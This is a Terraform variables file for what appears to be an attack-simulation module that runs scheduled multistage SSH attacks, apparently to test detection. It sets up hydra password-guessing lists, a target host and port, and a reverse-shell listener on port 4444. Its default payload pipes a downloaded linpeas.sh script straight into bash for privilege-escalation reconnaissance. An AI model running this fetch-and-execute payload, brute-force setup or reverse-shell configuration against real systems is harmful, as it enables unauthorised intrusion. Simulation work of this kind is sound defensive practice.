variable "environment" {
  type = string
  description = "name of the environment"
}

variable "deployment" {
  type = string
  description = "unique deployment id"
}

variable "region" {
  type = string
  description = "region for deployed resources"
}

variable "tag" {
  type = string
  default = "ssm_connect_ssh_shell_multistage_attacker"
}

variable "timeout" {
  type = number
  default = 5400
}

variable "cron" {
  type = string
  default = "cron(0 */2 * * ? *)"
}

variable "attack_delay" {
  type = number
  description = "wait time between baseline and attack (default: 12 hours)"
  default =  50400
}

variable "user_list" {
  type = string
  description = "Local path to users lists to use for hydra password guesses"
  default = "/tmp/hydra-users.txt"
}

variable "password_list" {
  type = string
  description = "Local path to password lists to use for hydra password guesses"
  default = "/tmp/hydra-passwords.txt"
}

variable "task" {
  type = string
  description = "Name of the attack to run - default custom will execute defined payload"
  default = "custom"
}

variable "payload" {
  type = string
  description = "The bash commands payload to execute when target machine connects"
  default = <<-EOT
            curl -L https://github.com/peass-ng/PEASS-ng/releases/download/20240414-ed0a5fac/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files
            EOT
}

variable "target_ip" {
  type = string
  description = "The host name or ip for the target system"
  default = null
}

variable "target_port" {
  type = number
  description = "The port for the target system"
  default = 22
}

variable "reverse_shell_host" {
  type = string
  description = "The hostname or ip for reverse shell connections"
  default = null
}

variable "reverse_shell_port" {
  type = number
  description = "The port for reverse shell connections"
  default = 4444
}